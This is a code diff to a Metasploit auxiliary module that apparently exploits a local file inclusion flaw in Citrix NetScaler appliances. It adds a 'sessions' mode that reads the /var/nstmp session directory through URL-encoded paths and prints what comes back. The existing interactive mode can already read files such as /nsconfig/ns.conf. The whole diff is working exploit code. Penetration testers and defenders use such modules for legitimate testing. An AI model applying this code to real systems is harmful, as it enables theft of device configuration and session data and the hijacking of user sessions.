@@ -40,7 +40,7 @@ class MetasploitModule < Msf::Auxiliary
     ))
 
     register_options([
-      OptEnum.new('MODE', [true, 'Start type.', 'discovery', [ 'discovery', 'interactive']]),
+      OptEnum.new('MODE', [true, 'Start type.', 'discovery', [ 'discovery', 'interactive', 'sessions']]),
       OptString.new('PATH', [false, 'File or directory you want to read', '/nsconfig/ns.conf']),
       OptString.new('TARGETURI', [true, 'Base path', '/'])
     ])
@@ -145,7 +145,16 @@ class MetasploitModule < Msf::Auxiliary
           end
         end
       when /interactive/
+        # TODO: parse response
         response = read_lfi(datastore['PATH'].gsub('/', '%2F'), var_rand)
+        if response.code == 406
+          print_line("#{response.body}")
+        end
+
+        return
+      when /sessions/
+        # TODO: parse response
+        response = read_lfi('/var/nstmp'.gsub('/', '%2F'), var_rand)
         if response.code == 406
           print_line("#{response.body}")
         end
